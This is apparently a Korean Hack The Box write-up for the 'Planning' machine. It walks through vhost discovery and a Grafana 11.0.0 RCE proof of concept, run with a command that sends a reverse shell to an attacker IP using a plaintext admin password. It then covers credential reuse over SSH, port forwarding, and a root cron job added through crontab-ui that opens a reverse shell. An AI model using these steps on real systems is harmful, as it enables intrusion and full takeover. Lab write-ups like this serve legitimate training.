# solve

- nmap 시 22,80 열림. 이때 도메인 이름이 있어서 `etc/hosts`에 매핑 추가. 추가로 서브도메인, vhost탐색 한 번 해볼 생각
![[Pasted image 20251020221252.png]]

- gobuster dir 탐색 시 아무것도 안 나옴. 하지만 vhost 탐색 시 `granfa.planning.htb`이라는 가상호스트 발견
![[Pasted image 20251020230726.png]]

- `etc/hosts`에 다시 매핑 추가 후 접속
![[Pasted image 20251020233022.png]]

- htb에서 알려준 account로 로그인
![[Pasted image 20251020234703.png]]

- grafana 11.0.0을 인터넷에 찾아보니 RCE가 가능한 공개 poc가 존재. 이때, searchsploit으로 찾보면 없지만 인터넷에는 존재한다.
![[Pasted image 20251021001621.png]]

- 저 poc파일을 이용해서 리버스쉘 획득에 성공
```
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.112 --reverse-port 1234
```
![[Pasted image 20251021001358.png]]

- 환경변수 확인 시 hostname을 확인해보니 도커 컨테이너 같음. 또한, enzo라는 admin 유저를 발견 및 비밀번호 역시 적혀있다.
![[Pasted image 20251021001915.png]]

- 따라서, enzo 유저로 ssh 로그인 성공
![[Pasted image 20251021002055.png]]

- 열려있는 포트 확인 시 8000, 3306 등 열림. 3306은 mysql, 3000은 grafana, 8000만 확인 불가. 이때, ps aux 등으로 확인하려해도 enzo로는 확인이 불가능하다.
![[Pasted image 20251021014758.png]]

- opt에서 흥미로운 crontabs 폴더를 발견함. grafana관련된 크론 작업 설정파일이 여기 들어있다.
![[Pasted image 20251021015123.png]]

- 이후에 실행 중인 서비스 확인해봤는데 crontab-ui.service라는 게 있다. 위에서 확인한 저 크론 설정파일 관련된 거라고 추측 가능. 따라서 인터넷에 오픈소스 검색해봄
![[Pasted image 20251021014710.png]]
![[Pasted image 20251021021045.png]]

- 아까 확인이 불가능했던 8000포트. 얘는 ss -tlnp로 포트 확인해보면 로컬에서만 접속이 됨. 따서 로컬 포트포워딩을 통해 kali에서 접속해준다.
```
# kali에서
ssh -L 8080:grafana.planning.htb:8000 enzo@grafana.planning.htb
```
![[Pasted image 20251021024025.png]]

- 이후 위에서 봤던 crontab.db에서 나온 비밀번호를 통해 root:비번 으로 접속 성공
![[Pasted image 20251021023007.png]]

- crontab ui에 아래와 같이 리버스쉘을 얻는 크론을 추가해서 root로 실행되는 크론이라 root로 리버스쉘 받기 성공 및 플래그 획득
![[Pasted image 20251021024825.png]]
![[Pasted image 20251021024740.png]]

